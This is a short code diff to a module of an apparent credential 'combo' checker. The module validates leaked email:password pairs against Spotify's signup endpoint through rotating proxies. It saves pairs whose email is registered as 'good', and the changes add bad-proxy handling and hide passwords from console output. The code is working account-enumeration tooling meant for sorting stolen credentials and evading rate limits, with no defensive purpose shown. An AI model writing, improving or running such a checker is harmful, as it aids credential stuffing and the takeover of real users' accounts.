@@ -1,6 +1,6 @@
 from __main__ import checker
 from requests import get
-from modules.functions import log,save,set_proxy
+from modules.functions import bad_proxy, log,save,set_proxy
 
 def check(email:str,password:str):
     retries = 0
@@ -10,7 +10,7 @@ def check(email:str,password:str):
             r = get(f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}",proxies=set_proxy(proxy),timeout=checker.timeout).text
             if "That email is already registered to an account." in r:
                 if not checker.cui:
-                    log("good",email+":"+password,"SpotifyVM")
+                    log("good",email,"SpotifyVM")
                 save("SpotifyVM","good",checker.time,email+":"+password)
                 checker.good += 1
                 checker.cpm += 1
@@ -20,9 +20,10 @@ def check(email:str,password:str):
             else:
                 raise
         except:
+            bad_proxy(proxy)
             checker.errors += 1
     if not checker.cui:
-        log("bad",email+":"+password,"SpotifyVM")
+        log("bad",email,"SpotifyVM")
     checker.bad += 1
     checker.cpm += 1
     return
